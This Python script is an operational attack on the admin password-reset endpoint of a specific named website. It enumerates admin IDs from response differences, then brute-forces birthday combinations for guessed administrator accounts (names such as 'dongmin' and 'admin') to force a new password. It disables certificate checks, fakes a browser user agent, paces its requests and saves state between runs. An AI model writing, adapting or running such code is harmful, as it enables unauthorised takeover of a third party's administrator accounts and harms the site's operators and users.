#!/usr/bin/env python3
"""Anonymous calibration + sampled attack of POST /admin-api/auth/password.

Phase 1 (calibration, ~8 reqs): distinguish unknown-ID vs wrong-birthday vs
accepted, with/without the old-password field. Phase 2 (sampled): if the
endpoint plausibly resets on (adminId, name, birthday) alone, grind a coarse
birthday grid for the top candidate IDs. Coarse = decades-boundary + summer
birthdays first; state in reset_state.json.
"""
import json
import os
import ssl
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
URL = "https://m.okbigyo.com:9443/bigyo/admin-api/auth/password"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
DELAY = float(os.environ.get("RESET_DELAY", "0.7"))
SAMPLE_CAP = int(os.environ.get("RESET_CAP", "240"))

# (adminId, candidate Korean names)
TARGETS = [
    ("dongmin", ["김동민", "동민"]),
    ("kimdongmin", ["김동민"]),
    ("kdongmin", ["김동민"]),
    ("admin", ["관리자", "어드민"]),
]
# coarse birthday grid: 1965..1995 step 5, months 01/07, days 01/15
YEARS = [1965, 1970, 1975, 1980, 1985, 1990, 1995]
MONTH_DAYS = [("01", "01"), ("01", "15"), ("07", "01"), ("07", "15")]
NEW_PW = "Reset!2026a"


def post(payload):
    body = json.dumps(payload).encode()
    req = urllib.request.Request(URL, data=body,
                                 headers={"User-Agent": UA, "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=12, context=CTX) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return None, repr(e)[:120]


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def main():
    log("=== CALIBRATION ===")
    calib = []
    payloads = [
        ("unknown-id-nopass", {"adminId": "zzz_no_such_admin_zzz", "name": "테스트", "birthday": "19900101", "newPassword": NEW_PW}),
        ("unknown-id-oldpass", {"adminId": "zzz_no_such_admin_zzz", "name": "테스트", "birthday": "19900101", "password": "Old!1234", "newPassword": NEW_PW}),
        ("dongmin-nopass", {"adminId": "dongmin", "name": "김동민", "birthday": "19900101", "newPassword": NEW_PW}),
        ("dongmin-oldpass", {"adminId": "dongmin", "name": "김동민", "birthday": "19900101", "password": "Old!1234", "newPassword": NEW_PW}),
        ("admin-nopass", {"adminId": "admin", "name": "관리자", "birthday": "19900101", "newPassword": NEW_PW}),
    ]
    for label, pl in payloads:
        st, body = post(pl)
        log(f"CALIB {label}: http={st} {body[:200]}")
        calib.append({"label": label, "payload": pl, "status": st, "body": body[:500]})
        time.sleep(DELAY)
    json.dump(calib, open(os.path.join(HERE, "reset_calib.json"), "w"), ensure_ascii=False, indent=1)

    # Decide: proceed only if known-id responses DIFFER from unknown-id ones
    unk = calib[0]["body"]
    known_differs = any(c["label"].startswith(("dongmin", "admin")) and c["body"] != unk for c in calib[2:])
    log(f"known-vs-unknown differential: {known_differs}")
    if not known_differs:
        log("no differential — endpoint likely uniform or token-gated; stopping sample phase")
        return

    log("=== SAMPLED BIRTHDAY GRID ===")
    state_f = os.path.join(HERE, "reset_state.json")
    state = json.load(open(state_f)) if os.path.exists(state_f) else {}
    spent = 0
    for aid, names in TARGETS:
        for nm in names:
            for y in YEARS:
                for mm, dd in MONTH_DAYS:
                    bd = f"{y}{mm}{dd}"
                    key = f"{aid}|{nm}|{bd}"
                    if key in state:
                        continue
                    if spent >= SAMPLE_CAP:
                        log(f"SAMPLE_CAP {SAMPLE_CAP} reached")
                        return
                    st, body = post({"adminId": aid, "name": nm, "birthday": bd, "newPassword": NEW_PW})
                    spent += 1
                    state[key] = {"status": st, "snippet": body[:200]}
                    log(f"GRID {aid} {nm} {bd}: http={st} {body[:160]}")
                    if '"success":true' in body or st == 200 and '"failCount"' not in body and 'false' not in body[:60]:
                        log(f"★★★ POSSIBLE RESET ACCEPTED: {aid} {nm} {bd}")
                    json.dump(state, open(state_f, "w"), ensure_ascii=False, indent=1)
                    time.sleep(DELAY)
    log("SAMPLE PASS DONE")


if __name__ == "__main__":
    main()
